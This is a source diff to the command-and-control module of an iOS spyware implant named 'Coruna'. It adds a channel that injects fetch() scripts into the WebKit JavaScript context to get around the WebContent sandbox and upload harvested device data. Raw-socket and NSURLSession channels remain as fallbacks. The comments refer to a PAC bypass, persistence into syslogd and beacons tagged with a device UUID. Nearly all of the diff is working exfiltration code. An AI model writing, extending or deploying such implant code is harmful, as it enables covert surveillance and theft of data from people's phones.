@@ -1,21 +1,26 @@
 /*
  * c2.c — C2 communication for Coruna payload (Objective-C + C, ARM64 iOS)
  *
- * Two upload channels:
+ * Three upload channels, tried in order until one succeeds:
  *
- *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY]
+ *   Channel C — JavaScriptCore context injection  [PRIMARY in WebContent]
+ *     Obtains the live JSContext via [JSContext currentContext] (available
+ *     when called from the JS execution thread, as is the case when Stage3
+ *     invokes _process() via PAC-bypassed function pointer).
+ *     Evaluates a fetch() script — uses WebKit's own networking, which is
+ *     always allowed inside WebContent (same XPC path as normal web requests).
+ *     A saved strong reference is also dispatched to the main queue from the
+ *     background implant thread (dispatch_async, never blocks harvest_all).
+ *
+ *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY outside WC]
  *     Uses socket()/connect() + Security.framework SSLCreateContext.
- *     Works inside WebContent because it does NOT use nsurlsessiond XPC
- *     (which is blocked by WebContent's sandbox policy).
- *     WebContent sandbox allows outbound TCP to port 443.
+ *     Intended for non-WebContent environments (e.g. after persistence into
+ *     syslogd).  In iOS 16+ WebContent sandbox socket(AF_INET) → EPERM.
  *
- *   Channel A — NSURLSession  [FALLBACK]
- *     Higher-level, handles redirects, modern session management.
- *     Blocked inside WebContent (nsurlsessiond XPC is denied by sandbox).
- *     Used as fallback in case Channel B fails outside WebContent.
- *
- * Ordering: Channel B is tried first for ALL calls.  This avoids a 12-second
- * per-call penalty in WebContent where Channel A always fails immediately.
+ *   Channel A — NSURLSession  [LAST RESORT]
+ *     Blocked in WebContent (nsurlsessiond XPC denied by sandbox policy).
+ *     Retained for environments outside WebContent where Channel B is somehow
+ *     unavailable (rare proxy or firewall configuration).
  */
 
 #import <Foundation/Foundation.h>
@@ -74,6 +79,103 @@ static NSString *c2_safe_str(const char *s) {
     if (!s) return @"";
     NSString *r = [NSString stringWithUTF8String:s];
     return r ? r : @"";
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * Channel C — JavaScriptCore context injection
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * When Stage3_VariantB.js calls _process() via a PAC-bypassed function
+ * pointer, we execute on the JSC main thread while vm.topCallFrame is active.
+ * [JSContext currentContext] returns the live JS context in this scenario.
+ *
+ * We build a self-executing fetch() script with the JSON body base64-encoded
+ * (atob() in JS decodes it), then call [ctx evaluateScript:].  The fetch()
+ * goes through WebKit's networking process XPC — the only allowed outbound
+ * path inside WebContent.
+ *
+ * A strong reference to the context is saved so that the background implant
+ * thread (implant_main) can dispatch fetch() calls to the main queue without
+ * ever needing to block harvest_all().
+ */
+
+/* Strong reference to the captured JSContext.  Set at most once (in process()
+ * before the background thread starts).  Retained for the process lifetime so
+ * background dispatches can fire as long as the page is loaded. */
+static id g_saved_jsc = nil;
+
+/* Build the JS fetch() script for a given body+uuid. */
+static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
+    NSString *b64body = [body base64EncodedStringWithOptions:0];
+    NSString *c2url   = [NSString stringWithFormat:@"%@://%s%s",
+                         C2_USE_HTTPS ? @"https" : @"http",
+                         C2_DOMAIN, C2_UPLOAD];
+    return [NSString stringWithFormat:
+        @"(function(){"
+        @"try{"
+        @"fetch('%@',{"
+        @"method:'POST',"
+        @"headers:{'Content-Type':'application/json','X-Device-UUID':'%@'},"
+        @"body:atob('%@')"
+        @"});"
+        @"}catch(e){}"
+        @"})();",
+        c2url, uuid, b64body];
+}
+
+/*
+ * upload_via_jsc_now — must be called from the JS execution thread.
+ *
+ * Calls [JSContext currentContext]; if non-nil saves it globally and
+ * evaluates the fetch() script synchronously (the fetch itself is async).
+ * Returns true if the script was dispatched.
+ */
+static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
+    Class jsCtxClass = NSClassFromString(@"JSContext");
+    if (!jsCtxClass) return false;
+
+    SEL currentSel = NSSelectorFromString(@"currentContext");
+    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
+    if (![jsCtxClass respondsToSelector:currentSel]) return false;
+
+    id ctx = [jsCtxClass performSelector:currentSel];
+    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;
+
+    /* Save for background-thread reuse — only set once, before any thread
+     * could race here (called from process() before coruna_constructor()). */
+    if (!g_saved_jsc) g_saved_jsc = ctx;
+
+    NSString *script = jsc_fetch_script(body, uuid);
+    [ctx performSelector:evalSel withObject:script];
+    return true;
+}
+
+/*
+ * upload_via_jsc_dispatch — safe to call from any thread.
+ *
+ * Dispatches a fetch() evaluation to the main queue using the saved context.
+ * Non-blocking (dispatch_async); suitable for background harvest uploads.
+ * Returns false immediately if no saved context is available.
+ */
+static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
+    id ctx = g_saved_jsc;
+    if (!ctx) return false;
+
+    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    if (![ctx respondsToSelector:evalSel]) return false;
+
+    /* Capture strong copies for the block; the block owns them until fired. */
+    __strong id capturedCtx    = ctx;
+    NSString  *capturedScript  = jsc_fetch_script(body, uuid);
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        @try {
+            [capturedCtx performSelector:evalSel withObject:capturedScript];
+        } @catch (...) {
+            /* Context may have been torn down if page navigated away. */
+        }
+    });
+    return true;
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════
@@ -266,14 +368,22 @@ static NSData *make_json_body(NSString *uuid, const char *category,
  * ═══════════════════════════════════════════════════════════════════════════ */
 
 /*
- * upload_to_c2 — post one JSON record; Channel B (raw socket) is tried first.
+ * upload_to_c2 — post one JSON record via Channel C → B → A.
  *
- * Channel B is the reliable path inside WebContent where nsurlsessiond XPC is
- * blocked.  Channel A (NSURLSession) is the fallback for environments where
- * Channel B is somehow unavailable (e.g. rare proxy/firewall setup).
+ * Channel C (JSContext fetch injection):
+ *   • On the JS thread (process() call):   upload_via_jsc_now()     [sync eval]
+ *   • On a background thread (implant_main): upload_via_jsc_dispatch() [async]
+ *   Works in WebContent because fetch() uses WebKit's own networking XPC.
+ *   Worst-case addition: <1 ms on JS thread; 0 ms (non-blocking) on bg thread.
  *
- * Total worst-case blocking time: ~10 s (Channel B only) or ~22 s (B fails,
- * A also fails).  In practice Channel B succeeds and returns in <2 s.
+ * Channel B (raw socket + TLS):
+ *   Works outside WebContent (e.g. syslogd persistence).
+ *   In iOS 16+ WebContent socket(AF_INET) → EPERM; skipped almost instantly.
+ *   Worst case: 10-second connect timeout.
+ *
+ * Channel A (NSURLSession):
+ *   Blocked in WebContent (nsurlsessiond XPC denied by sandbox).
+ *   Worst case: 10-second timeout.
  */
 void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data) {
@@ -282,12 +392,20 @@ void upload_to_c2(const char *category, const char *path,
         NSData   *body = make_json_body(uuid, category, path, description, b64data);
         if (!body) return;
 
-        /* Channel B — primary (works in WebContent) */
-        bool sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
-                                   uuid.UTF8String,
-                                   (const uint8_t *)body.bytes, body.length);
+        /* Channel C — JS injection on JS thread (process() context) */
+        bool sent = upload_via_jsc_now(body, uuid);
 
-        /* Channel A — fallback */
+        /* Channel C — JS injection from background thread via saved context */
+        if (!sent)
+            sent = upload_via_jsc_dispatch(body, uuid);
+
+        /* Channel B — raw POSIX socket + SecureTransport */
+        if (!sent)
+            sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
+                                  uuid.UTF8String,
+                                  (const uint8_t *)body.bytes, body.length);
+
+        /* Channel A — NSURLSession (last resort, works outside WebContent) */
         if (!sent) {
             NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
             NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
@@ -299,13 +417,17 @@ void upload_to_c2(const char *category, const char *path,
 }
 
 /*
- * upload_beacon — synchronous diagnostic probe called from process() before
- * the background thread starts.
+ * upload_beacon — synchronous diagnostic probe called from process().
  *
- * Uses Channel B (raw socket) directly for immediate reliability.
- * A record in server logs confirms: binary v1.3 is running, raw-socket path
- * works inside WebContent sandbox.
- * Falls back to Channel A if Channel B fails.
+ * Called before coruna_constructor() so it executes on the JS execution
+ * thread — the ideal moment for Channel C (JSContext is live).
+ *
+ * Channel C:  evaluates fetch() in current JSContext.  If this appears in
+ *             server logs the description contains "(jsc)".
+ * Channel B:  raw socket, works outside WebContent / after persistence.
+ * Channel A:  NSURLSession fallback.
+ *
+ * Blocked time: <1 ms if Channel C succeeds; up to ~10 s if only B is tried.
  */
 void upload_beacon(void) {
     @autoreleasepool {
@@ -314,20 +436,32 @@ void upload_beacon(void) {
         sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);
 
         NSString *uuid = coruna_device_uuid();
-        NSString *desc = [NSString stringWithFormat:
-                          @"beacon v" PAYLOAD_VERSION " ios=%s pid=%d proc=%s",
-                          ios_ver, (int)getpid(), getprogname() ?: "?"];
 
+        /* ── Channel C ── */
+        {
+            NSString *desc = [NSString stringWithFormat:
+                              @"beacon v" PAYLOAD_VERSION
+                              @" ios=%s pid=%d proc=%s (jsc)",
+                              ios_ver, (int)getpid(), getprogname() ?: "?"];
+            NSData *body = make_json_body(uuid,
+                                          "system", "/coruna/beacon",
+                                          desc.UTF8String, "");
+            if (body && upload_via_jsc_now(body, uuid)) return;
+        }
+
+        /* ── Channel B / A ── */
+        NSString *desc = [NSString stringWithFormat:
+                          @"beacon v" PAYLOAD_VERSION
+                          @" ios=%s pid=%d proc=%s",
+                          ios_ver, (int)getpid(), getprogname() ?: "?"];
         NSData *body = make_json_body(uuid,
                                       "system", "/coruna/beacon",
                                       desc.UTF8String, "");
         if (!body) return;
 
-        /* Channel B first */
         bool sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
                                    uuid.UTF8String,
                                    (const uint8_t *)body.bytes, body.length);
-        /* Channel A fallback */
         if (!sent) {
             NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
             NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
